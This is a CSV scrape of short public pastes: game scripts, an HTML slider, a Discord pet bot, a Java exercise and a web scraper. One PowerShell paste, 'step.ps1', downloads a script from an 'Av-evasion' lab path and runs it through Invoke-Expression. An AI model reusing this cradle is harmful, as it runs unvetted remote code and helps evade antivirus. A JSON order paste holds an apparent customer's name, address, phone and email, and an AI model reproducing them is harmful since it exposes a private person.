id,title,username,language,date,content
R94Zv141,getLootCrate.sqf,kerbo_,SQF,Thursday 9th of May 2024 10:14:03 AM CDT,"# create a default Antistasi loot box near the player
_box = createVehicle[""Box_IND_Wps_F"", position player];
clearWeaponCargoGlobal _box;   
clearMagazineCargoGlobal _box;  
clearItemCargoGlobal _box;  
clearBackpackCargoGlobal _box;
[_box] call A3A_fnc_initObject;
"
X4ZjvQjN,border circle,bstefano79,HTML,Thursday 9th of May 2024 10:12:16 AM CDT,"<!DOCTYPE html>
<html lang=""it"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Bordo Circolare Progressivo</title>
    <style>
        .circle-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px;
        }

        .outer-circle {
            width: 220px; 
            height: 220px;
            border-radius: 50%;
            background: conic-gradient(red 0% 0%, black 0% 100%);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .inner-circle {
            width: 200px;  
            height: 200px;
            background-color: #f0f0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .circle-content {
            font-family: Arial, sans-serif;
            font-size: 18px;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class=""circle-wrapper"">
        <div class=""outer-circle"">
            <div class=""inner-circle"">
                <div id=""circle"" class=""circle-content"">0%</div>
            </div>
        </div>
    </div>
    <input type=""range"" min=""0"" max=""100"" value=""0"" id=""rangeInput"" style=""width: 100%;"">
    <script>
        const outerCircle = document.querySelector('.outer-circle');
        const rangeInput = document.getElementById('rangeInput');

        rangeInput.addEventListener('input', function() {
            let percentage = this.value;
            outerCircle.style.background = `conic-gradient(red 0% ${percentage}%, black ${percentage}% 100%)`;
            const c = document.getElementById(""circle"").innerHTML=percentage+""%"";
        });
    </script>
</body>
</html>"
ax2EJ0cB,Untitled,Matimampusluanjay,Lua,Thursday 9th of May 2024 10:07:56 AM CDT,"U know where?
I'm here to be cook
I'm
I'm
I'm
I'm 
Not a
Not a
Crook
Crook
Girl and know i'm taking what not your
Taking what not you
Taking what not you
Girl and know i'm taking what not your
Taking what not your
Taking what not your"
i6MyPqUc,step.ps1,evi1ginx,PowerShell,Thursday 9th of May 2024 09:13:19 AM CDT,"﻿# URL to download safe file
$scriptUrl = ""https://github.com/salahgeek/LAB/blob/main/LAS/Av-evasion/8443.ps1""
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent"
KPy9Aq7K,Fetch info from PlayPilot,DanielFrank,JavaScript,Thursday 9th of May 2024 08:26:38 AM CDT,"<script type=""text/javascript"">
    function scrapePlayPilot() {
        var PlayPilotURL = document.getElementById('<%= txtPlayPilotURL.ClientID %>').value;
        console.log('PlayPilot URL entered:', PlayPilotURL);

        $.get(PlayPilotURL, function (data) {
            // Create a temporary element to parse the HTML content
            var tempElement = document.createElement('div');
            tempElement.innerHTML = data;

            // Find the anchor tag with IMDb URL
            var imdbAnchor = tempElement.querySelector('a.link[href*=""imdb.com""]');
            if (imdbAnchor) {
                var imdbURL = imdbAnchor.href;
                console.log('Scraped IMDb URL:', imdbURL);
                var txtIMDbURL = document.getElementById('<%= txtIMDbURL.ClientID %>');
                if (txtIMDbURL && !txtIMDbURL.value) {
                    // Only set the IMDb URL if the field is empty
                    txtIMDbURL.value = imdbURL;
                }
            } else {
                console.log('IMDb URL not found in the PlayPilot page.');
            }

            // Find YouTube URLs based on their context
            var youtubeLinks = tempElement.querySelectorAll('a[href*=""youtube.com""]');
            youtubeLinks.forEach(function (youtubeLink) {
                var parentElement = youtubeLink.parentElement;
                if (parentElement && parentElement.classList.contains('video-block')) {
                    var youtubeURL = youtubeLink.href;
                    console.log('Scraped YouTube URL:', youtubeURL);
                    var txtTrailerURL = document.getElementById('<%= txtTrailerURL.ClientID %>');
                    if (txtTrailerURL && !txtTrailerURL.value) {
                        // Only set the YouTube URL if the field is empty
                        txtTrailerURL.value = youtubeURL;
                    }
                }
            });

            if (!txtTrailerURL.value) {
                console.log('YouTube URL not found on the PlayPilot page.');
            }
        });
    }
</script>"
VXc3hS2Y,Untitled,sambacar,JSON,Thursday 9th of May 2024 08:18:59 AM CDT,"#request
{
  ""id"": ""100003767500000000"",
  ""order_number"": ""100003767500000000"",
  ""order_date"": ""2024-05-09T13:14:56"",
  ""status"": ""open"",
  ""customer"": {
    ""contact_name"": ""Petar Sambolek"",
    ""first_name"": ""Petar"",
    ""last_name"": ""Sambolek"",
    ""street"": ""Ulica Svete Ane 57"",
    ""postcode"": ""31000"",
    ""city"": ""Osijek"",
    ""phone"": ""0923051110"",
    ""e_mail"": ""sambolek.petar@gmail.com""
  },
  ""items"": [
    {
      ""position"": 1,
      ""product"": {
        ""ean_code"": ""3858893611806"",
        ""name"": ""OMRON M3 tlakomjer + adapter""
      },
      ""quantity"": 1,
      ""price"": 92.23
    },
    {
      ""position"": 2,
      ""product"": {
        ""sku"": ""dostava""
      },
      ""quantity"": 1,
      ""price"": ""0.00""
    }
  ],
  ""payment"": {
    ""status"": ""pending"",
    ""method"": ""wire_transfer""
  },
  ""discount_amount"": ""0.0000""
}

#response
[R005] Invalid [price] data type for order row [id:] [position:2] [] []"
WWV593Pb,Filmovi (Bakurski),niske,Java,Thursday 9th of May 2024 08:15:27 AM CDT,"public class ZadFilmovi{
	
	public static void main (String[] args) {
		SpisakFilmova Movies = new SpisakFilmova();
		Movies.unesiFilm(""Interstelar"");
			Movies.unesiGlumca(""Dusan"", ""Interstelar"");
			Movies.unesiGlumca(""Dusan"", ""Interstelar"");
			Movies.unesiGlumca(""Jovan"", ""Interstelar"");
			
		Movies.unesiFilm(""Superman"");
			Movies.unesiGlumca(""Mila"", ""Superman"");
			Movies.unesiGlumca(""Mila"", ""Superman"");
			Movies.unesiGlumca(""Maks"", ""Superman"");
			//Movies.unesiGlumca(""Jovan"", ""Superman"");
			
		Movies.unesiFilm(""Iron man"");
			Movies.unesiGlumca(""Milan"", ""Iron man"");
			Movies.unesiGlumca(""Zoran"", ""Iron man"");
			Movies.unesiGlumca(""Dusan"", ""Iron man"");
			//Movies.unesiGlumca(""Jovan"", ""Iron man"");
		
		Movies.unesiFilm(""Spajdermen"");
			Movies.unesiGlumca(""Jovan"", ""Spajdermen"");
			Movies.unesiGlumca(""Milan"", ""Spajdermen"");
			Movies.unesiGlumca(""Zoran"", ""Spajdermen"");
			Movies.unesiGlumca(""Dusan"", ""Spajdermen"");
			
		Movies.unesiFilm(""Zombie"");
			Movies.unesiGlumca(""Jovan"", ""Zombie"");
			Movies.unesiGlumca(""Milan"", ""Zombie"");
			Movies.unesiGlumca(""Zoran"", ""Zombie"");
			Movies.unesiGlumca(""Dusan"", ""Zombie"");
			
			Movies.unesiGlumca(""TEST"", """");
			
		System.out.println(Movies);
		
		Movies.izbrisiFilmove(""Jovan"");
		//Movies.izbrisiFilmove(""Jovan"");
		
		System.out.println(""\n"" + Movies);
	}
}

class SpisakFilmova{
		
		//Film
		class Film{
			String ime;
			Film veza;
			Glumci sadrzaj;
			
			public Film(String ime){
				this.ime = ime;
				this.veza = null;
				this.sadrzaj = null;
			}
			
			public String toString(){
				if (sadrzaj == null) // OVO MI JE CHATGPT REKAO :(
					return ime + "": Nema glumaca"";
					
				Glumci tek = sadrzaj;
				String s = ime + "": "" + tek.imePrezime;
				tek = tek.veza;
				
				while(tek != null){
					s += "", "" + tek;
					tek = tek.veza;
				}
				
				return s;
			}
		}
		
		//Glumci
		class Glumci{
			String imePrezime;
			Glumci veza;
			
			public Glumci(String s){
				this.imePrezime = s;
				this.veza = null;
			}
			
			public String toString(){
				return imePrezime + """";
			}
		}
		
		Film prviFilm;
		
		//Metode:
		
		//Dodavanje filmva
		public boolean proveraFilmova(String cilj){
			Film tek = prviFilm;
			
			while(tek != null){
				if(cilj.equalsIgnoreCase(tek.ime)){
					return true;
				}
				
				tek = tek.veza;
			}
			
			return false;
		}
		
		public void unesiFilm(String ime){
			if(!proveraFilmova(ime)){
				Film tek = prviFilm;
				prviFilm = new Film(ime);
				prviFilm.veza = tek;
			}
		}
		
		//Dodavanje glumaca
		public boolean proveraGlumaca(String cilj, String imeFilma){
			Film tekFilm = prviFilm;
			
			while(tekFilm != null){
				if(tekFilm.ime == imeFilma)
					break;
					
				tekFilm = tekFilm.veza;
			}
			
			if(tekFilm != null){
				Glumci tekGlumac = tekFilm.sadrzaj;
				
				while(tekGlumac != null){
					if(cilj.equalsIgnoreCase(tekGlumac.imePrezime))
						return true;
				
					tekGlumac = tekGlumac.veza;
				}
				
				tekFilm = tekFilm.veza;
			}
			
			return false;
		}
		
		public void unesiGlumca(String ime, String film){
			if(!proveraGlumaca(ime, film)){
				Film tek = prviFilm;
				
				while(tek != null){
					if(tek.ime == film){
						Glumci tekGlumci = tek.sadrzaj;
						tek.sadrzaj = new Glumci(ime);
						tek.sadrzaj.veza = tekGlumci;
						break;
					}
					
					tek = tek.veza;
				}
			}
		}
		
		//Izbrise prvo filmove na pocetku liste, pa onda ostale
		public void izbrisiFilmove(String glumac){
			if(prviFilm == null){
				System.out.println(""Nema filmova"");
			} else {
				
				while(prviFilm != null){
					Glumci tekGlumac = prviFilm.sadrzaj;
					boolean pomocna = true;
					
					while(tekGlumac != null){
						if(tekGlumac.imePrezime.equalsIgnoreCase(glumac)){
							prviFilm = prviFilm.veza;
							pomocna = false;
							break;
						}
						
						tekGlumac = tekGlumac.veza;
					}
					
					if(pomocna)
						break;
				}
				
			
				if(prviFilm != null){
					Film tekFilm = prviFilm.veza;
					Film prethodni = prviFilm;
					
					while(tekFilm != null){
						Glumci tekGlumac = tekFilm.sadrzaj;
						
						while(tekGlumac != null){
							if(tekGlumac.imePrezime.equalsIgnoreCase(glumac)){
								prethodni.veza = tekFilm.veza;
								break;
							}
							
							tekGlumac = tekGlumac.veza;	
						}
						
						prethodni = tekFilm;
						tekFilm = tekFilm.veza;
					}
				}
			}
		}
		
		
		//Ispis
		public String toString(){
			String s = ""Spisak filmova:"";
			
			if (prviFilm == null) // OVO MI JE CHATGTP REKAO :(
				return s + "" Nema filmova"";

			Film tek = prviFilm;
			
			while (tek != null){
				s += ""\n"" + tek;
				tek = tek.veza;
			}
			
			return s;
		}
}
"
rkNiPeUp,information,tomtomvader298,JavaScript,Thursday 9th of May 2024 07:42:41 AM CDT,"const { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const db = require('../database.js');
const teaGreen = require('../teaGreen.js');
//

module.exports = {
    data: new SlashCommandBuilder()
        .setDefaultMemberPermissions(PermissionFlagsBits.SendMessages)
        .setDMPermission(false)
        .setName('pet')
        .setDescription('Adopt, Play, Grow')
        .addSubcommand(subcommand =>
            subcommand
                .setName('adopt')
                .setDescription('Adopt A Pet!')
                .addStringOption(option => option.setName('chosen-name').setDescription('Name Your Pet').setRequired(true))
                .addStringOption(option =>
                    option.setName('pet-type-option')
                        .setDescription('Select A Animal As Your Pet')
                        .addChoices(
                            { name: 'Cat', value: 'Cat' },
                            { name: 'Dog', value: 'Dog' },
                            { name: 'Fish', value: 'Fish' },
                            { name: 'Bird', value: 'Bird' },
                            { name: 'Rabbit', value: 'Rabbit' },
                            { name: 'Hamster', value: 'Hamster' },
                            { name: 'Guinea Pig', value: 'Guinea Pig' },
                            { name: 'Turtle', value: 'Turtle' },
                            { name: 'Ferret', value: 'Ferret' },
                            { name: 'Snake', value: 'Snake' },
                            { name: 'Lizard', value: 'Lizard' },
                            { name: 'Gerbil', value: 'Gerbil' },
                            { name: 'Hedgehog', value: 'Hedgehog' },
                            { name: 'Chinchilla', value: 'Chinchilla' },
                            { name: 'Parrot', value: 'Parrot' },
                            { name: 'Hermit Crab', value: 'Hermit Crab' },
                            { name: 'Sugar Glider', value: 'Sugar Glider' },
                            { name: 'Axolotl', value: 'Axolotl' },
                            { name: 'Gecko', value: 'Gecko' },
                            { name: 'Mouse', value: 'Mouse' },
                            { name: 'Frog', value: 'Frog' },
                            { name: 'Snail', value: 'Snail' },
                            { name: 'Betta Fish', value: 'Betta Fish' },
                            { name: 'Rat', value: 'Rat' },
                        )
                        .setRequired(true))
                .addStringOption(option =>
                    option.setName('animal-stage-option')
                        .setDescription('Select A Animal Stage')
                        .addChoices(
                            { name: 'Newborn', value: 'Newborn' },
                            { name: 'Adult', value: 'Adult' },
                            { name: 'Elder', value: 'Elder' },
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('feed')
                .setDescription('Feed Your Pet')
                .addStringOption(option =>
                    option.setName('food-option')
                        .setDescription('Select A Food To Give Your Pet')
                        .addChoices(
                            { name: 'Wet Food', value: 'Wet Food' },
                            { name: 'Dry Food', value: 'Dry Food' },
                            { name: 'Animal Treats', value: 'Animal Treats' }
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('play')
                .setDescription('Play With Your Pet')
                .addStringOption(option =>
                    option.setName('toy-option')
                        .setDescription('Select A Toy To Give Your Pet')
                        .addChoices(
                            { name: 'Ball', value: 'Ball' },
                            { name: 'Rope', value: 'Rope' },
                            { name: 'Laser Pointer', value: 'Laser Pointer' }
                        )
                        .setRequired(true))
        )
        //
        .addSubcommand(subcommand =>
            subcommand
                .setName('information')
                .setDescription('Pet Information')
        )

    ,
    async execute(interaction) {
        await interaction.deferReply()

        if (interaction.options.getSubcommand() === 'adopt') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                interaction.editReply({ content: `You Already Adopted A Pet` })
            } else {
                const petNameProvided = interaction.options.getString('chosen-name');
                const chosenAnimal = interaction.options.getString('pet-type-option')
                const animalStage = interaction.options.getString('animal-stage-option')

                const adoptionCertificateEmbed = new EmbedBuilder().setColor(teaGreen)
                    .setTitle('New Pet')
                    .setDescription(`
            # Congrats ${interaction.user.globalName ?? interaction.user.username}, You Adopted ${petNameProvided}
            `).addFields(
                        { name: `Name Provided`, value: `${petNameProvided}` },
                        { name: `Type Of Animal`, value: `${chosenAnimal}` },
                        { name: `Stage`, value: `${animalStage}` }
                    )

                const superPetNameCreation = [
                    { name: 'PetName', value: `${petNameProvided}` }
                ];
                const superPetTypeCreation = [
                    { name: 'PetType', value: `${chosenAnimal}` }
                ];
                const superPetStageCreation = [
                    { name: 'PetStage', value: `${animalStage}` }
                ];
                await interaction.editReply({ content: null, embeds: [adoptionCertificateEmbed], polls: null, files: [], components: [], ephemeral: true, tts: false, fetchReply: false })
                await db.set(`petname_${interaction.user.id}_${interaction.guild.id}`, superPetNameCreation)
                await db.set(`pettype_${interaction.user.id}_${interaction.guild.id}`, superPetTypeCreation)
                await db.set(`petstage_${interaction.user.id}_${interaction.guild.id}`, superPetStageCreation)
                await db.set(`petadopted_${interaction.user.id}_${interaction.guild.id}`, true)
            }


        }

        if (interaction.options.getSubcommand() === 'feed') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const foodOption = interaction.options.getString('food-option');

                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return petNameFromDatabase = 'Cannot Find Name [Internal Error]';
                }

                let author = await db.get(`fedpettimeout_${interaction.user.id}_${interaction.guild.id}`);
                let timeout = 600000; //Set 10 minutes in milliseconds
                if (author !== null && timeout - (Date.now() - author) > 9000) {
                    let time = timeout - (Date.now() - author);
                    let hours = Math.floor(time / (60 * 60 * 1000)); // Calculate hours from milliseconds
                    time -= hours * 60 * 60 * 1000; // Subtract the hours in milliseconds
                    let minutes = Math.floor(time / (60 * 1000));
                    time -= minutes * 60 * 1000;
                    let seconds = Math.floor(time / 1000);
                    let timedout = new EmbedBuilder()
                        .setTitle(""Timed Out"")
                        .setDescription(`${interaction.user.globalName ?? interaction.user.username} You Have Already Fed ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} Recently.\nTime Left: \`${minutes}m:${seconds}s\``)
                        .setColor(teaGreen)
                        .setFooter({ text: 'Go Play With Your Pet!' })
                        .setTimestamp();
                    interaction.editReply({ embeds: [timedout] });
                } else {
                    const petfedTotal = await db.get(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`) 
                    let amountOfTimesFedPet = 0;

                    if (petfedTotal) {
                        amountOfTimesFedPet = petfedTotal + 1; // Increment the existing count
                    } else {
                        amountOfTimesFedPet = 1; // Set to 1 if not tracked
                    }

                    const fedPetEmbed = new EmbedBuilder().setColor(teaGreen).setTitle(`Pet Fed`)
                        .setDescription(`
                # ${interaction.user.globalName ?? interaction.user.username} You have fed ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} with ${foodOption}, They are now full
                `)
                    await interaction.editReply({ content: null, embeds: [fedPetEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
                    await db.set(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`, amountOfTimesFedPet)
                    await db.set(`fedpettimeout_${interaction.user.id}_${interaction.guild.id}`, Date.now())
                }
            } else {
              await interaction.editReply({ content: `You Need A Pet To Feed, Heres My Pet Rock To Feed Stones To` })
            }

        }

        if (interaction.options.getSubcommand() === 'play') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const petToy = interaction.options.getString('toy-option');

                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return;
                }

                let author = await db.get(`playwithpettimeout_${interaction.user.id}_${interaction.guild.id}`);
                let timeout = 600000; //Set 10 minutes in milliseconds
                if (author !== null && timeout - (Date.now() - author) > 9000) {
                    let time = timeout - (Date.now() - author);
                    let hours = Math.floor(time / (60 * 60 * 1000)); // Calculate hours from milliseconds
                    time -= hours * 60 * 60 * 1000; // Subtract the hours in milliseconds
                    let minutes = Math.floor(time / (60 * 1000));
                    time -= minutes * 60 * 1000;
                    let seconds = Math.floor(time / 1000);
                    let timedout = new EmbedBuilder()
                        .setTitle(""Timed Out"")
                        .setDescription(`${interaction.user.globalName ?? interaction.user.username} You Have Already Played ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} Recently.\nTime Left: \`${minutes}m:${seconds}s\``)
                        .setColor(teaGreen)
                        .setFooter({ text: 'Go Feed Your Pet!' })
                        .setTimestamp();
                    interaction.editReply({ embeds: [timedout] });
                } else {
                    const playedWithPetTotal = await db.get(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`) 

                    let amountOfTimesPlayedWithPet = 0;

                    if (playedWithPetTotal) {
                        amountOfTimesPlayedWithPet = playedWithPetTotal + 1; // Increment the existing count
                    } else {
                        amountOfTimesPlayedWithPet = 1; // Set to 1 if not tracked
                    }

                    const playWithPetEmbed = new EmbedBuilder().setColor(teaGreen).setTitle(`Pet Fed`)
                        .setDescription(`
                # ${interaction.user.globalName ?? interaction.user.username} You have played with ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} by using ${petToy}, They are now happy
                `)
                    await interaction.editReply({ content: null, embeds: [playWithPetEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
                    await db.set(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`, amountOfTimesPlayedWithPet)
                    await db.set(`playwithpettimeout_${interaction.user.id}_${interaction.guild.id}`, Date.now())
                }
            } else {
               await interaction.editReply({ content: `You Need A Pet To Play With, Heres My Pet Rock To Play Fetch With` })
            }

        }
        if (interaction.options.getSubcommand() === 'information') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return;
                }

                const petType = await db.get(`pettype_${interaction.user.id}_${interaction.guild.id}`)
                const petTypeEntryFinder = petName.findIndex(entry => entry.name === ""PetType"");
                let petTypeFromDatabase;

                if (petTypeEntryFinder !== -1) {
                    petTypeFromDatabase = petType[petTypeEntryFinder].value;
                } else {
                    return;
                }


                const petStage = await db.get(`petstage_${interaction.user.id}_${interaction.guild.id}`)
                const petStageEntryFinder = petName.findIndex(entry => entry.name === ""PetStage"");
                let petStageFromDatabase;

                if (petStageEntryFinder !== -1) {
                    petStageFromDatabase = petStage[petStageEntryFinder].value;
                } else {
                    return;
                }

                const petfedTotal = await db.get(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`) 
                const trackedTotalFedPet = petfedTotal > 0 ? petfedTotal : 'Animal Abuser, FEED ME';

                const playedWithPetTotal = await db.get(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`) 
                const trackedPlayedWithPetTotal = playedWithPetTotal > 0 ? playedWithPetTotal : 'Don\'t Forget About Me, Play With me';

                const petInformationEmbed = new EmbedBuilder().setColor(teaGreen)
                    .setTitle(`Pet Information For: ${interaction.user.globalName ?? interaction.user.username}'s Pet`)
                    .addFields(
                        { name: `Name:`, value: `${petNameFromDatabase}` },
                        { name: `Type:`, value: `${petTypeFromDatabase}` },
                        { name: `Stage:`, value: `${petStageFromDatabase}` },
                        { name: `Amount Of Time Being Fed`, value: `${trackedTotalFedPet}` },
                        { name: `Amount Of Play Times:`, value: `${trackedPlayedWithPetTotal}` },
                    )
                    console.log(petInformationEmbed)
                    
                await interaction.editReply({ content: null, embeds: [petInformationEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
            } else {
               await interaction.editReply({ content: `You Need A Pet To Get Information From With, Heres My Pet Rock, Hes Rocky, Eats Stones & Is A Elder` })
            }
        }
    },
};

//const trackedPets = await db.get(`petsgiven_${interaction.user.id}_${interaction.user.id}`) || 0;//May Add Later Down The Road"
3pudwH3e,fix for bid input - Avada theme,wpgenie,PHP,Thursday 9th of May 2024 07:21:07 AM CDT,"/* Avada bid input fix - display quantity for auctions even as they are marked as sold individually */

.auction_form .quantity.buttons_added {
    display: flex !important;
}"
5wBWyd0M,DropItem,fornakter,Lua,Thursday 9th of May 2024 07:08:11 AM CDT,"-- ServerScriptService ScriptDropItem
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local dropEvent = ReplicatedStorage:WaitForChild('DropEvent')

dropEvent.OnServerEvent:Connect(function(player)
	
	local playerModel = game.Workspace:FindFirstChild(player.Name)
	if playerModel then
		local tool = playerModel:FindFirstChildWhichIsA(""Tool"")
		if tool then
			tool.Parent = game.Workspace
		end
	end
	
end)"
mEhU2uSb,Handle,fornakter,Lua,Thursday 9th of May 2024 07:06:47 AM CDT,"-- Tool - Handle - ProximityPrompt script
local tool = script.Parent.Parent.Parent
local Prox = script.Parent
local TI = tool.Handle.TouchInterest
TI:Destroy()

Prox.Triggered:Connect(function(player)
	tool.Parent = player.Backpack
	Prox:Destroy()
end)"
